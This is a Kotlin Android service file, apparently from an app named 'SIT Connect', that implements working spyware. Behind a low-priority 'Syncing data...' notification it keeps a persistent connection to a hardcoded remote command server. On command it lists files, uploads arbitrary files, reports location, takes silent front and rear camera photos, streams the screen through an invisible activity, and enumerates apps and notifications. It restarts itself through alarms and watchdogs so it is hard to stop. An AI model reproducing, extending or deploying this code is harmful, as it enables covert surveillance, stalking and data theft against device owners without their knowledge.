package com.example.sitconnect2

import android.Manifest
import android.app.Activity.RESULT_OK
import android.app.AlarmManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import java.io.BufferedReader
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.InputStreamReader
import java.io.PrintWriter
import java.io.RandomAccessFile
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.ServerSocket
import java.net.Socket
import java.nio.ByteBuffer
import java.nio.channels.FileChannel
import java.nio.channels.FileLock
import java.util.concurrent.atomic.AtomicBoolean

class AgentService : Service() {

    companion object {
        const val CHANNEL_ID = "C2_SERVICE_CHANNEL"
        const val NOTIFICATION_ID = 101

        @JvmStatic
        val isScreenSharingActive = AtomicBoolean(false)
    }

    private val isAgentRunning = AtomicBoolean(false)
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    // File lock for single-instance guarantee across processes
    private var lockFile: RandomAccessFile? = null
    private var fileChannel: FileChannel? = null
    private var fileLock: FileLock? = null

    // Port lock guarding C2 connection (Process Mutex)
    private var portLockSocket: ServerSocket? = null

    // Reference to the active C2 connection socket to allow forcing closure on destroy
    private var c2Socket: Socket? = null

    @Volatile
    private var keepRunning = true
    private var agentThread: Thread? = null

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var screenCaptureThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        // Create channel immediately when service is created
        createNotificationChannel()

        // Acquire WakeLock to keep CPU running
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AgentService::WakeLock")
        wakeLock?.acquire()

        // Acquire WifiLock to keep network active
        val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        @Suppress("DEPRECATION")
        wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "AgentService::WifiLock")
        wifiLock?.acquire()
    }

    override fun onDestroy() {
        super.onDestroy()
        keepRunning = false

        // Interrupt the background thread to break any blocking I/O or sleep
        agentThread?.interrupt()
        screenCaptureThread?.interrupt()

        isScreenSharingActive.set(false)
        virtualDisplay?.release()
        imageReader?.close()
        mediaProjection?.stop()

        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
        if (wifiLock?.isHeld == true) {
            wifiLock?.release()
        }

        releaseProcessLock()
        scheduleRestart(this)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        scheduleRestart(this)
    }

    private fun scheduleRestart(context: Context) {
        val restartIntent = Intent(context, RestartReceiver::class.java).apply {
            action = "com.example.sitconnect.RESTART_SERVICE"
        }
        // Send direct broadcast first for immediate restart if process is alive
        context.sendBroadcast(restartIntent)

        // Schedule an alarm for fail-safe restart in case process is dying
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            0,
            restartIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
        // If exact alarm permission is granted, use it. Otherwise approximate.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (alarmManager?.canScheduleExactAlarms() == true) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 1000,
                    pendingIntent
                )
            } else {
                alarmManager?.setAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 1000,
                    pendingIntent
                )
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager?.setExactAndAllowWhileIdle(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        } else {
            alarmManager?.setExact(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        }
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient

    @RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Start foreground immediately with a permission-safe service type.
        // startForegroundWithNotification() checks location permission at runtime before
        // including FOREGROUND_SERVICE_TYPE_LOCATION, preventing the SecurityException crash.
        startForegroundWithNotification()

        // Handle screen share request from HomeScreen - Process ALWAYS, even if agent is running
        if (intent?.action == "START_SCREEN_SHARE") {
            val projectionIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra("projection_intent", Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("projection_intent")
            }
            projectionIntent?.let { startScreenCapture(it) }
        }

        // Schedule a watchdog alarm to ensure the service stays alive (or revives if killed)
        scheduleWatchdog()

        // Guard against multiple threads being spawned if onStartCommand is called again
        // (e.g. from both MainActivity and BootReceiver, or on service restart via START_STICKY)
        if (isAgentRunning.compareAndSet(false, true)) {
            if (acquireProcessLock()) {
                // Only delay on boot — not on restarts caused by permission changes or system kills
                val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
                startPersistentAgent("139.59.244.51", 6001, fromBoot)
            } else {
                Log.w("AgentService", "Duplicate instance detected (process lock failed). Stopping.")
                isAgentRunning.set(false)
                stopSelf()
            }
        }

        return START_STICKY
    }

    private fun startForegroundWithNotification() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SIT Connect")
            .setContentText("Syncing data...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // IMPORTANT: only include FOREGROUND_SERVICE_TYPE_LOCATION if the permission is already
            // granted at runtime — passing it without a granted permission throws SecurityException
            // on SDK 34+ and crashes the service (this was the original crash bug).
            val hasLocation = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED

            val hasCamera = checkSelfPermission(Manifest.permission.CAMERA) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED

            var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (hasLocation) {
                serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (hasCamera && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }

            try {
                startForeground(NOTIFICATION_ID, notification, serviceType)
            } catch (e: Exception) {
                Log.e("AgentService", "startForeground failed, retrying with DATA_SYNC only", e)
                // Last-resort fallback: drop location type if system still rejects it
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (e2: Exception) {
                    Log.e("AgentService", "startForeground failed entirely", e2)
                }
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startScreenCapture(projectionData: Intent) {
        if (isScreenSharingActive.getAndSet(true)) return

        try {
            // Update foreground service to include media projection type
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SIT Connect")
                .setContentText("Syncing data...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                        else 0

                startForeground(NOTIFICATION_ID, notification, serviceType)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }

            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(RESULT_OK, projectionData)

            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        super.onStop()
                        isScreenSharingActive.set(false)
                        Log.d("AgentService", "MediaProjection stopped by system")
                    }
                }, android.os.Handler(mainLooper))
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "AgentScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, null
            )

            screenCaptureThread = Thread {
                var screenSocket: Socket? = null
                var out: java.io.DataOutputStream? = null

                while (isScreenSharingActive.get() && keepRunning) {
                    try {
                        if (screenSocket == null || screenSocket.isClosed) {
                            screenSocket = Socket("139.59.244.51", 6003)
                            screenSocket.soTimeout = 5000
                            out = java.io.DataOutputStream(screenSocket.getOutputStream())
                        }
                    } catch (e: Exception) {
                        Log.e("AgentService", "Screen socket connect error", e)
                        Thread.sleep(1000)
                        continue
                    }

                    var image: Image? = null
                    try {
                        image = imageReader?.acquireLatestImage()
                        if (image != null) {
                            val bitmap = image.toBitmap()
                            val baos = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos) // 30% quality
                            val jpegBytes = baos.toByteArray()

                            // Send size then data
                            out?.writeInt(jpegBytes.size)
                            out?.write(jpegBytes)
                            out?.flush()
                            Log.d("AgentService", "Sent frame: ${jpegBytes.size} bytes")
                        } else {
                            Log.d("AgentService", "Image is null, dropping frame")
                        }
                    } catch (e: Exception) {
                        Log.e("AgentService", "Screen stream error", e)
                        try { screenSocket.close() } catch (ex: Exception) {}
                        screenSocket = null
                    } finally {
                        image?.close()
                    }

                    Thread.sleep(400) // ~2.5 fps – adjust as needed
                }
                try { screenSocket?.close() } catch (e: Exception) {}
            }.apply { isDaemon = true; start() }

            Log.i("AgentService", "Screen capture → started")

        } catch (e: Exception) {
            Log.e("AgentService", "Failed to start screen capture", e)
            isScreenSharingActive.set(false)
        }
    }

    private fun Image.toBitmap(): Bitmap {
        val plane = planes[0]
        val buffer: ByteBuffer = plane.buffer
        val pixelStride = plane.pixelStride
        val rowStride = plane.rowStride
        val rowPadding = rowStride - pixelStride * width

        val bitmap = Bitmap.createBitmap(
            width + rowPadding / pixelStride,
            height,
            Bitmap.Config.ARGB_8888
        )

        bitmap.copyPixelsFromBuffer(buffer)
        return bitmap
    }

    private fun acquireProcessLock(): Boolean {
        return try {
            val f = File(cacheDir, "agent_instance.lock")
            lockFile = RandomAccessFile(f, "rw")
            fileChannel = lockFile?.channel
            // tryLock() is non-blocking. Returns null if lock is held by another process.
            // On Android, file locks are advisory but effective for cooperation between our own processes.
            fileLock = fileChannel?.tryLock()

            if (fileLock == null) {
                Log.w("AgentService", "Another process holds the lock.")
                closeLockResources()
                false
            } else {
                Log.i("AgentService", "Process lock acquired successfully.")
                true
            }
        } catch (e: Exception) {
            Log.e("AgentService", "Error acquiring file lock", e)
            closeLockResources()
            false
        }
    }

    private fun releaseProcessLock() {
        try {
            fileLock?.release()
        } catch (e: Exception) {
            Log.e("AgentService", "Error releasing file lock", e)
        }
        closeLockResources()
    }

    private fun closeLockResources() {
        try { fileChannel?.close() } catch (e: Exception) {}
        try { lockFile?.close() } catch (e: Exception) {}
        fileLock = null
        fileChannel = null
        lockFile = null
    }

    private fun scheduleWatchdog() {
        // Schedule an alarm to poke the service every 15 minutes to keep it alive/restart it
        val restartIntent = Intent(this, RestartReceiver::class.java).apply {
            action = "com.example.sitconnect.RESTART_SERVICE"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            this,
            1001, // Unique Request Code for Watchdog
            restartIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val alarmManager = getSystemService(ALARM_SERVICE) as? AlarmManager
        val triggerTime = System.currentTimeMillis() + 15 * 60 * 1000 // 15 minutes

        // We use setAndAllowWhileIdle to ensure it fires even in Doze mode
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager?.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
        } else {
            alarmManager?.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
        }
    }

    // Android 15 (API 35) introduced a 6-hour timeout for dataSync foreground services.
    // Override onTimeout() to stop and restart the service gracefully instead of crashing.
    @RequiresApi(Build.VERSION_CODES.VANILLA_ICE_CREAM)
    override fun onTimeout(startId: Int, fgsType: Int) {
        Log.w("AgentService", "Timeout reached. Scheduling restart...")
        val restartIntent = Intent(applicationContext, AgentService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        // Restart in 5 seconds
        alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pendingIntent)
        isAgentRunning.set(false)
        stopSelf()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Agent Channel",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Used for background persistent connection"
            }
            val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    @androidx.annotation.RequiresPermission(allOf = [Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION])
    private fun startPersistentAgent(ip: String, port: Int, delayStart: Boolean = false) {
        agentThread = Thread {
            // General Startup Delay: Reduced to 500ms for faster responsiveness while still allowing
            // a brief window for the previous connection to clear on the server side.
            try {
                Thread.sleep(500)
            } catch (e: InterruptedException) {
                return@Thread
            }

            // BLOCKING LOCK ACQUISITION
            if (!acquirePortLock()) {
                Log.w("AgentService", "Port lock acquisition failed, another instance might be running.")
                isAgentRunning.set(false)
                return@Thread
            }

            try {
                // On boot, wait 10 seconds for Wi-Fi/Data to initialise before connecting.
                // On restarts (e.g. after a permission change), connect immediately.
                if (delayStart) {
                    try { Thread.sleep(10000) } catch (e: InterruptedException) { return@Thread }
                }

                while (keepRunning) {
                    try {
                        if (Thread.interrupted()) break

                        val socket = Socket()
                        socket.keepAlive = true
                        // socket.connect(InetSocketAddress(ip, port), 5000)

                        // Use a longer timeout for connect, and set a read timeout to detect dead server
                        // socket.soTimeout = 0 // Infinite timeout is risky if NAT drops
                        // socket.soTimeout = 120000 // 2 minutes? No, let's stick to infinite but rely on keepAlive

                        socket.connect(InetSocketAddress(ip, port), 10000)

                        // Use BufferedReader instead of Scanner for more robust line reading
                        val reader = BufferedReader(InputStreamReader(socket.getInputStream()))
                        val output = PrintWriter(socket.getOutputStream(), true)
                        val c2Commands = C2ServerCommands(this@AgentService)

                        while (keepRunning) {
                            val command = reader.readLine() ?: break // null means stream closed (EOF)

                            // Copy your command logic from MainActivity here
                            val response = when {
                                command == "ping" -> "pong"
                                command == "sys_info" -> c2Commands.getSysInfo()

                                command.startsWith("ls ") -> {
                                    val path = command.substringAfter("ls ")
                                    val directory = File(path)

                                    if (directory.exists() && directory.isDirectory) {
                                        val files = directory.listFiles()
                                        // Join file names with a newline for the Python server to read easily
                                        files?.joinToString(separator = "\n") { it.name } ?: "Directory is empty"
                                    } else {
                                        "Error: Path does not exist or is not a directory"
                                    }
                                }

                                command.startsWith("download ") -> {
                                    val filePath = command.substringAfter("download ")
                                    val file = File(filePath)

                                    if (file.exists() && file.isFile) {
                                        val originalTimeout = socket.soTimeout
                                        try {
                                            socket.soTimeout = 0 // Disable timeout for massive files
                                            output.println("SIZE ${file.length()}")

                                            file.inputStream().use { fileInput ->
                                                val buffer = ByteArray(65536) // Match the server's 64KB buffer
                                                var bytesRead: Int
                                                val socketOutput = socket.getOutputStream()
                                                while (fileInput.read(buffer).also { bytesRead = it } != -1) {
                                                    socketOutput.write(buffer, 0, bytesRead)
                                                }
                                                socketOutput.flush()
                                            }
                                            if (file.name.startsWith("snapshot_")) {
                                                file.delete()
                                            }
                                            // Return null so the app doesn't send "File sent successfully"
                                            // The server is expecting exactly file_size bytes and nothing else.
                                            null
                                        } catch (e: Exception) {
                                            "Error: ${e.message}"
                                        } finally {
                                            socket.soTimeout = originalTimeout
                                        }
                                    } else {
                                        "Error: File not found"
                                    }
                                }

                                command == "location" -> c2Commands.getDeviceLocation()

                                command == "snapshot" || command == "snapshot_front" -> {
                                    val latch = java.util.concurrent.CountDownLatch(1)
                                    var resultText = "Error taking snapshot"
                                    val camera = SilentCamera(this@AgentService)

                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                                        camera.takePicture(android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT, object : SilentCamera.Callback {
                                            override fun onImageSaved(file: java.io.File?) {
                                                resultText = if (file != null) "SNAPSHOT_READY ${file.absolutePath}" else "Error: Failed to capture snapshot"
                                                latch.countDown()
                                            }
                                        })
                                    }

                                    latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
                                    resultText
                                }

                                command == "snapshot_rear" -> {
                                    val latch = java.util.concurrent.CountDownLatch(1)
                                    var resultText = "Error taking snapshot"
                                    val camera = SilentCamera(this@AgentService)

                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                                        camera.takePicture(android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK, object : SilentCamera.Callback {
                                            override fun onImageSaved(file: java.io.File?) {
                                                resultText = if (file != null) "SNAPSHOT_READY ${file.absolutePath}" else "Error: Failed to capture snapshot"
                                                latch.countDown()
                                            }
                                        })
                                    }

                                    latch.await(15, java.util.concurrent.TimeUnit.SECONDS)
                                    resultText
                                }

                                command == "snapshot_both" -> {
                                    val latch = java.util.concurrent.CountDownLatch(1)
                                    var resultText = "Error taking snapshots"
                                    val camera = SilentCamera(this@AgentService)

                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                                        camera.takePictureBoth(object : SilentCamera.BothCallback {
                                            override fun onImagesSaved(frontFile: java.io.File?, rearFile: java.io.File?) {
                                                resultText = when {
                                                    frontFile != null && rearFile != null ->
                                                        "SNAPSHOT_BOTH_READY ${frontFile.absolutePath} ${rearFile.absolutePath}"
                                                    frontFile != null ->
                                                        "SNAPSHOT_READY ${frontFile.absolutePath}"
                                                    rearFile != null ->
                                                        "SNAPSHOT_READY ${rearFile.absolutePath}"
                                                    else -> "Error: Failed to capture snapshots"
                                                }
                                                latch.countDown()
                                            }
                                        })
                                    }

                                    latch.await(30, java.util.concurrent.TimeUnit.SECONDS)
                                    resultText
                                }

                                command == "start_screen" -> {
                                    val actIntent = Intent(applicationContext, InvisibleScreenShareActivity::class.java).apply {
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                                    }
                                    applicationContext.startActivity(actIntent)
                                    "Attempting to start screen share discreetly..."
                                }

                                command == "apps" -> c2Commands.getInstalledApps()

                                command == "user_apps" -> c2Commands.getUserInstalledApps()

                                command == "running_apps" -> c2Commands.getRunningApps()

                                command == "battery" -> c2Commands.getBatteryLevel()

                                command == "device_stats" -> c2Commands.getDeviceStats()

                                command == "network_info" -> c2Commands.getNetworkInfo()

                                command == "list_notifications" -> c2Commands.getActiveNotifications()

                                command.startsWith("notify ") -> {
                                    val payload = command.substringAfter("notify ")
                                    val parts = payload.split("|", limit = 2)
                                    val title = if (parts.size == 2) parts[0] else "Message"
                                    val message = if (parts.size == 2) parts[1] else payload
                                    c2Commands.sendNotification(title, message)
                                    "Notification sent"
                                }

                                else -> "Received: $command"
                            }
                            output.println(response)
                        }

                        // If we break out, it means EOF (server closed connection)
                        Log.i("AgentService", "Server closed connection")

                    } catch (e: Throwable) {
                        // Check if we were interrupted (service stopping)
                        if (!keepRunning || e is InterruptedException) {
                            Log.i("AgentService", "Agent thread stopping...")
                            break
                        }
                        Log.e("AgentService", "Connection failed or error occurred, retrying in 10s: ${e.message}")

                        try {
                            Thread.sleep(10000) // Wait longer between retries
                        } catch (sleepEx: InterruptedException) {
                            break // Stop if interrupted during sleep
                        }
                    }
                }
            } finally {
                // Allow a new thread to be started if this one ever exits
                isAgentRunning.set(false)

                // Cleanup C2 socket reference immediately to break connection
                try {
                    c2Socket?.close()
                } catch (e: Exception) {}
                c2Socket = null

                // EXIT GAP:
                // Hold the port lock for a brief moment AFTER disconnecting C2.
                // This blocks any eager new instance from connecting until we are truly gone.
                try {
                    Thread.sleep(2000)
                } catch (e: Exception) {}

                // Release the global lock so next instance can take it
                try {
                    portLockSocket?.close()
                } catch (e: Exception) {}
            }
        }
        agentThread?.start()
    }

    private fun acquirePortLock(): Boolean {
        return try {
            // Bind specifically to IPv4 loopback to avoid ambiguity
            val addr = InetAddress.getByName("127.0.0.1")
            portLockSocket = ServerSocket(54321, 0, addr).apply { reuseAddress = false }
            Log.i("AgentService", "Port lock acquired on 127.0.0.1:54321")
            true
        } catch (e: Exception) {
            Log.w("AgentService", "Port lock busy, waiting... ${e.message}")
            // Check more frequently (every 200ms) instead of waiting 2s
            try { Thread.sleep(200) } catch (i: InterruptedException) { return false }
            // If failed to bind, check if we should keep trying
            if (keepRunning) {
                // Simple recursive retry or just return false to let the loop handle it
                // But here we want to block until acquired or timed out.
                // Refactored simple retry loop below:
                return acquirePortLockRetryLoop()
            }
            false
        }
    }

    private fun acquirePortLockRetryLoop(): Boolean {
        var attempts = 0
        while (keepRunning && attempts < 50) { // 50 * 200ms = 10s max wait
            try {
                val addr = InetAddress.getByName("127.0.0.1")
                portLockSocket = ServerSocket(54321, 0, addr).apply { reuseAddress = false }
                Log.i("AgentService", "Port lock acquired on retry ($attempts)")
                return true
            } catch (e: Exception) {
                // Log.w("AgentService", "Port lock still busy ($attempts)...") // reduce log noise
                try { Thread.sleep(200) } catch (i: InterruptedException) { return false }
                attempts++
            }
        }
        return false
    }


    override fun onBind(intent: Intent?): IBinder? = null
}
